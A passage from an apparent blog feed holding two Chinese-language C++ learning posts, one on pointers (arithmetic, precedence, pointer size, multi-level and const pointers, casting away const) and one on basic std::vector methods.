&lt;&lt; std::endl;</span><br><span class="line">p = &amp;b; <span class="comment">//修改指针p的地址为变量b的地址。</span></span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; &amp;b &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见效果：<img src="/2022/05/02/pointer/005.png" class=""></p><blockquote><p>变量b的地址一开始时FF574，指针p在初始化的时候地址是变量a的地址，我们在后面修改了指针p的地址，使其得到变量b的地址。效果在第二次打印的时候可以看出。<br>可能有的人会有点懵，这里需要自己先理一下*和&amp;的角度。</p></blockquote><p>简单梳理完后，我们知道&amp;也是属于单目运算符，那么指针是否也可以实现一些加减操作呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line">p = &amp;a;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">*p--;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们直接对指针–操作：<img src="/2022/05/02/pointer/006.png" class=""><br>编译器其实也给出了警告：<img src="/2022/05/02/pointer/007.png" class=""></p><ol><li>这里能看出来p和a地址之间差了4？</li><li>a的值能够正常输出，指针却不能显示正确的值了？</li></ol><p>首先为什么会差了4，这跟类型占用空间有关。<br>为什么不能输出a的值了，原因在于，少了4之后的内存地址，我们没有给它赋值过，程序也不知道那一段数据有什么，万一前面的空间占了8字节，而我们只截取了一部分，那么数据也就是不完整的了。</p><blockquote><p>所以指针要慎用，你要明确的知道你这个指针的操作是有什么目的。</p></blockquote><p>至于为什么<code>p--</code>是修改地址而不是对a进行操作，这也跟运算符的优先级有关，我们将指针p用括号括起来看看效果：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> *p;</span><br><span class="line">p = &amp;a;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">(*p)--;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，<code>(*p)--</code>之后，a的值同样发生了改变：<img src="/2022/05/02/pointer/008.png" class=""><br>这也意味着<code>(*p)-- == a--</code>，能减自然也能加，能–在后，也能–放在前。</p><hr><h2 id="指针数组"><a href="#指针数组" class="headerlink" title="指针数组"></a>指针数组</h2><h3 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h3><p>跟数组一样，在变量名前加个*，例如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> *pCh[<span class="number">10</span>];   <span class="comment">//代表声明了10个int类型的指针</span></span><br></pre></td></tr></table></figure><p>在此之前，我们先验证一下正常的数组的内存地址是否是连续的：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ch[<span class="number">10</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">    std::cout &lt;&lt; &amp;ch[i] &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到：<img src="/2022/05/02/pointer/009.png" class=""></p><blockquote><p>16进制，A&#x3D;10,B&#x3D;11。。。F&#x3D;15</p></blockquote><p>这个一维数组的内存地址也让我们很好理解了，上述对单个指针–操作的时候为什么地址少了4，原因离不开变量的类型。<br>二维数组以至于多维数组的地址也都是连续的。</p><hr><h2 id="指针大小"><a href="#指针大小" class="headerlink" title="指针大小"></a>指针大小</h2><p>利用<code>sizeof()</code>同样可以测出指针的大小</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p&#123;&#125;;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">sizeof</span>(p) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是：<img src="/2022/05/02/pointer/010.png" class=""><br>看到是8，很多人会想到可能跟变量类型有关。那如果是char类型的指针呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *p&#123;&#125;;</span><br><span class="line">    <span class="type">char</span> *cp&#123;&#125;;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">sizeof</span>(p) &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">sizeof</span>(cp) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果是：<img src="/2022/05/02/pointer/012.png" class=""><br>两者都是8，说明了一个问题，指针它声明的时候他自己其实也是个变量，是变量就需要占用内存空间。</p><blockquote><p>tips: 默认vs2022 是使用x64编译，你可以尝试一下x86编译后。</p></blockquote><img src="/2022/05/02/pointer/011.png" class=""><p>可以看到在x86下编译执行后，指针的占用空间变成4字节了，这其实跟操作系统位数有关：</p><hr><h3 id="操作系统位数的影响"><a href="#操作系统位数的影响" class="headerlink" title="操作系统位数的影响"></a>操作系统位数的影响</h3><p>32位的操作系统下，寻址范围是32位，也就是32bit，等于4byte。<br>64位的操作系统下，寻址能力是64位，也就是64bit，等于8byte。</p><blockquote><p>这里先不扯寄存器和地址总线的问题，一旦深究，会发现和现实情况有所出入，目前先代入理解指针为什么一会占用4字节一会占用8字节。</p></blockquote><p>我们在x86下打印指针p的地址看一看：<img src="/2022/05/02/pointer/013.png" class=""></p><p>16进制两位等于一字节，这里有8位 &#x2F; 2 &#x3D; 4，也就是4字节。<br>转换成x64下再印呢？<img src="/2022/05/02/pointer/014.png" class=""><br>这里一共16位 &#x2F; 2 &#x3D; 8，也就是8字节。</p><blockquote><p>为什么不打印char *指针的地址呢，首先我们要明白一个事，指针内存占用是4字节或者8字节了，但是char本身只占用一个字节的空间。那么将char类型的地址赋给char *就会产生一个问题，char*可以表示出char，但是你直接打印char *的时候，四字节只有一个字节是有明确含义的地址，就会导致乱码。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">char</span> c = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="type">int</span> *p = &amp;a;</span><br><span class="line"><span class="type">char</span> *cp = &amp;c;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">sizeof</span>(p) &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">sizeof</span>(cp) &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; cp &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>打印后可以很清楚的看到：<img src="/2022/05/02/pointer/015.png" class=""><br>A是打印了，但是后面都是乱码。</p><hr><p>然后回到上文：我们继续探讨指针</p><p>想必几个简单的案例，就能看出指针的强大之处。可是越强大就越不好掌握。</p><p>再往下看</p><img src="/2022/05/02/pointer/016.png" class=""><p>首先，不同类型隐式转换肯定不成功，那么我们就用强制转换</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> ui = <span class="number">999</span>;</span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span>*) &amp;ui;</span><br></pre></td></tr></table></figure><img src="/2022/05/02/pointer/017.png" class=""><p>值都是正常的，我们说unsigned是无符号的意思，也就是说ui不能表示为负数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*p = <span class="number">-1</span>;</span><br></pre></td></tr></table></figure><p>输出ui的时候发现，ui变得很大，这是因为变量都有固定的大小，四字节的时候，2^32次-1正好就是这个数。</p><blockquote><p>如果使用更大类型或者更小类型去强转，则会发生不可预料的情况，因为ui默认只占了四字节，多了或少了系统读取的内存不一样了，内容也会各不相同。</p></blockquote><img src="/2022/05/02/pointer/018.png" class=""><p>但是我们再输出*p:<img src="/2022/05/02/pointer/019.png" class=""><br>发现正常输出-1了，这是因为指针就是int类型，而ui却是unsigned。可想而知，计算机太单纯了，他单纯的表示二进制，符号位也是我们强加的，因此指针的类型不但在于它占用多少空间，更是为了让计算机怎么去处理这个指针的内容。</p><hr><h2 id="练习一下"><a href="#练习一下" class="headerlink" title="练习一下"></a>练习一下</h2><h3 id="1—"><a href="#1—" class="headerlink" title="1—"></a>1—</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[] &#123;<span class="number">10001</span>,<span class="number">20001</span>,<span class="number">30001</span>,<span class="number">40001</span>&#125;;</span><br><span class="line"><span class="type">int</span> *p = &amp;a[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//(*p)++ or *p++的结果</span></span><br></pre></td></tr></table></figure><p>首先*p 目前是a[0]的地址，可以打印出10001。<br>()阔号的优先级更高，所以先在内存中读出10001，然后在进行++操作，故此(*p)++ &#x3D; 10002，但是由于直接打印，++在右边，所以先输出10001，然后在自增。</p><p>而*p++呢，没有修改优先级，相当于地址+1，那么默认在p的地址上+4，为什么加4前面说过了，int类型占用四字节，地址自增，就是每次往后移动四字节【根据类型】。所以这里*p++的结果为20001。但是同理，++在右，先运算在自增。由于之前(*p)++了，所以这里的*p的值默认变成了10002，但是对于地址而言，移动四字节变成了a[1]:20001的地址。</p><blockquote><p>这里不好理解的话，再解释一下，int类型的指针默认占用4字节，x86的情况下，当计算机去读取的时候肯定也是四个字节来读，那么指针+1，他肯定是要按照它本身地址+类型占用空间，通俗的话说这个1就是它自己<br>+1 就使得p的地址移动到了20001的地址，那么从a[0]开始+2，p就会移动到30001的地址</p></blockquote><img src="/2022/05/02/pointer/020.png" class=""><p>当然这个可能看上去不直观，那么修改一下先输出数组所有元素的地址</p><img src="/2022/05/02/pointer/021.png" class=""><p>然后的然后我们就可以开始套娃了：<br>是变量都会有占用空间，都会有内存地址，那么指针变量也不例外</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; &amp;p &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>就可以输出指针的地址了，以上述的题打样：</p><img src="/2022/05/02/pointer/022.png" class=""><p>应该是能清楚看到p的地址比数组成员都要大，当然这是因为数组先声明，在内存中肯定早点申请了空间。</p><h3 id="2—"><a href="#2—" class="headerlink" title="2—"></a>2—</h3><p>回归正题，*p 能操作同类型的地址，那么如何操作*p的地址呢。<br>有意思的衍生出了二级指针</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> **p2;</span><br></pre></td></tr></table></figure><p>需要注意的是：</p><ul><li>二级指针只能指向一级指针的地址，不能指向单纯的变量地址</li><li>不用尝试&amp;&amp;去获取变量的地址，无效套娃</li></ul><img src="/2022/05/02/pointer/023.png" class=""><img src="/2022/05/02/pointer/024.png" class=""><img src="/2022/05/02/pointer/025.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::cout &lt;&lt; p &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *p2 &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>输出p的地址和*p2的地址是相同的：<img src="/2022/05/02/pointer/026.png" class=""><br>那么**p2的值就是*p代表的值了：<img src="/2022/05/02/pointer/027.png" class=""></p><blockquote><p>反复提醒：变量存在于局部时，每次运行分配的地址与之前不同。</p></blockquote><p>如果你想要整一个int ***p3和int ****p4，ok都没关系，都可以操作，只是相应的，要注意高级别的指针只能指向低一级的地址。【多维数组与多级指针息息相关】</p><h3 id="3—"><a href="#3—" class="headerlink" title="3—"></a>3—</h3><p>补充一个东西，const 是限定一个变量为常量，即初始化后不可以修改。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> *p = &amp;a;<span class="comment">//肯定会报错，因为二者类型不相同</span></span><br></pre></td></tr></table></figure><p>所以指针也要变成const</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> *p = &amp;a;<span class="comment">//这样才合法</span></span><br></pre></td></tr></table></figure><p>const是限定了一个常量。那么常量指针还能从而修改值吗？<br>答案是不能：<img src="/2022/05/02/pointer/028.png" class=""><br>但是，常量指针可以重新指向别的常量：<img src="/2022/05/02/pointer/029.png" class=""></p><blockquote><p>const int *p 的当const在前的时候即限定了这个指针不能修改地址里面的值，只能换地址<br>随记表面 const能放后面。int *const p<br>脑袋肯定晕乎乎了。。。不过const在前时指针称为常量指针，const在后时称为指针常量</p></blockquote><p>先看指针常量：<br>当const出现在变量名前面的时候，就已经是常量了，说明了这个指针初始化后肯定是不能修改地址了。<br>不过还是能修改初始化时地址的变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">int</span> *<span class="type">const</span> p = &amp;a;</span><br><span class="line"></span><br><span class="line">p = &amp;b;<span class="comment">//error：左值是常量不可修改</span></span><br><span class="line">*p = <span class="number">300</span>;<span class="comment">//合法，因为指针常量指向的仍然是一个变量</span></span><br></pre></td></tr></table></figure><p>还没完！！！！！！<br>const前后都放过了，那如果前后都存在呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> b = <span class="number">200</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> *<span class="type">const</span> p = &amp;a;</span><br><span class="line"></span><br><span class="line">p = &amp;b;<span class="comment">//error</span></span><br><span class="line">*p = <span class="number">300</span>;<span class="comment">//error</span></span><br></pre></td></tr></table></figure><p>当出现两个const的时候，称之为指向常量的常量指针，也就说当这个指针初始化后，既不可以修改指向的内存地址，也不可以修改内存地址上的数据。<br>说人话就是这种限定完之后啥都不能改了。</p><hr><h2 id="强制转换"><a href="#强制转换" class="headerlink" title="强制转换"></a>强制转换</h2><p>强制转换用到的地方也不少，在两个类型不相同的变量传递之间，隐式转换不起作用那么就需要我们手动强制转换，指针也不例外。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p = &amp;a;<span class="comment">//error，因为类型不一致</span></span><br></pre></td></tr></table></figure><img src="/2022/05/02/pointer/030.png" class=""><p>将其修改为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">int</span> a = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *p = (<span class="type">int</span> *) &amp;a;</span><br></pre></td></tr></table></figure><p>然后印证指针p指向的是a的地址：<code>std::cout &lt;&lt; *p &lt;&lt; std::endl;</code></p><img src="/2022/05/02/pointer/031.png" class=""><p>打印出来的也是1000，说明没啥问题。</p><p>如果我们修改指针的值呢，发现也的确可以修改：</p><img src="/2022/05/02/pointer/032.png" class=""><p>但是有个问题了，a是什么，a是一个常量，它的值会改变吗？</p><img src="/2022/05/02/pointer/033.png" class=""><p>打上断点转到反汇编浅看一下：</p><img src="/2022/05/02/pointer/034.png" class=""><ol><li>在初始化a的时候，将[3E8h]转成十进制就是1000 mov到 a的地址上。</li><li>然后将a强转给指针p的时候，编译器先把a的地址存到rax寄存器上</li><li>*p&#x3D;250的时候，又把p的地址 mov到 rax寄存器上，然后将[0FAh]这个十六进制转换成十进制就是250 mov到rax寄存器的地址上。</li><li>然后打印*p的时候，又先将指针p的地址mov到rax上，在将rax的地址mov到rdx上；打印a的时候则是直接将[3E8h] 1000的值 mov到rdx上。</li></ol><blockquote><p>虽然对于汇编知识较为欠缺，但是凭大概看法就是，编译器是修改了*p的值，但是他也记住了a本身的值一样，就是类似于宏定义，这样不论什么时候调用a，他都直接以3E8h的值进行传递。</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>指针还是很神奇的东西。。以后不少地方还会用到，得好好摸索摸索。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>std::vector</title>
      <link href="/2022/04/30/std-vector/"/>
      <url>/2022/04/30/std-vector/</url>
      
        <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li>vector头文件</li><li>IDE：vs 2022</li></ul><span id="more"></span><hr><h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><ul><li>std::vector&lt;数据类型&gt; 变量名;</li><li>std::vector<int> v;                    &#x2F;&#x2F;基本定义</li><li>std::vector<int> v1{ 1,2,3,4,5 };    &#x2F;&#x2F;直接初始化</li><li>std::vector<int> v2(5);            &#x2F;&#x2F;成员容量为五个</li><li>std::vector<int> v3(5, 100);    &#x2F;&#x2F;五个成员均为100</li></ul><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>容器方面，对成员的访问方式都可以通过[],即：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; v&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    std::cout &lt;&lt; v[<span class="number">2</span>] &lt;&lt; std::endl;     <span class="comment">//合法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="size"><a href="#size" class="headerlink" title="size()"></a>size()</h2><p>这个不多说，跟之前的array一样，返回vector的成员个数。</p><hr><h2 id="push-back"><a href="#push-back" class="headerlink" title="push_back()"></a>push_back()</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">v3</span><span class="params">(<span class="number">5</span>, <span class="number">100</span>)</span></span>;<span class="comment">//五个成员均为100</span></span><br><span class="line"></span><br><span class="line">std::cout &lt;&lt; v3.<span class="built_in">size</span>() &lt;&lt; std::endl;</span><br><span class="line">v3.<span class="built_in">push_back</span>(<span class="number">200</span>);</span><br><span class="line">std::cout &lt;&lt; v3.<span class="built_in">size</span>() &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：</p><img src="/2022/04/30/std-vector/000.png" class=""><blockquote><p>也就是说v3扩容了，那么再来看看他所有成员的值。</p></blockquote><p>利用c++提供的for循环：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : v3)&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到结果：<img src="/2022/04/30/std-vector/001.png" class=""></p><hr><h2 id="assign"><a href="#assign" class="headerlink" title="assign()"></a>assign()</h2><p>在初始化的时候我们提到过：<code>std::vector&lt;int&gt; v3(5, 100);    </code>，即定义一个拥有五个成员且值都为100的vector。<br>而assign()，他会覆盖掉以前的值，也就是说即便你初始化过，后期添加或删除过，都可以用assign覆盖。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">v3</span><span class="params">(<span class="number">5</span>, <span class="number">100</span>)</span></span>;<span class="comment">//五个成员均为100</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : v3)&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v3.<span class="built_in">assign</span>(<span class="number">10</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : v3)&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到结果：<img src="/2022/04/30/std-vector/002.png" class=""></p><hr><h2 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h2><p>有覆盖的方法，那么就会想到清空，clear就能够实现清空一个vector</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">v3</span><span class="params">(<span class="number">5</span>, <span class="number">100</span>)</span></span>;<span class="comment">//五个成员均为100</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : v3)&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v3.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i : v3)&#123;</span><br><span class="line">    std::cout &lt;&lt; i &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现清空之后没有值了</p><img src="/2022/04/30/std-vector/003.png" class=""><hr><h2 id="empty"><a href="#empty" class="headerlink" title="empty()"></a>empty()</h2><blockquote><p>能清空就需要能判断是否为空</p></blockquote><p>empty的返回值是布尔类型，vector为空返回true，不为空返回false</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">v3</span><span class="params">(<span class="number">5</span>, <span class="number">100</span>)</span></span>;<span class="comment">//五个成员均为100</span></span><br><span class="line">std::cout &lt;&lt; v3.<span class="built_in">empty</span>() &lt;&lt; std::endl;</span><br><span class="line">v3.<span class="built_in">clear</span>();</span><br><span class="line">std::cout &lt;&lt; v3.<span class="built_in">empty</span>() &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>能够清楚的看到情况前后v3的状态：</p><img src="/2022/04/30/std-vector/004.png" class=""><blockquote><p>0和1是正常的，规定里0代表false，1代表true</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>STL记得还有挺多的，以前看过黑马的c++，用的少了现在从头理理吧。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
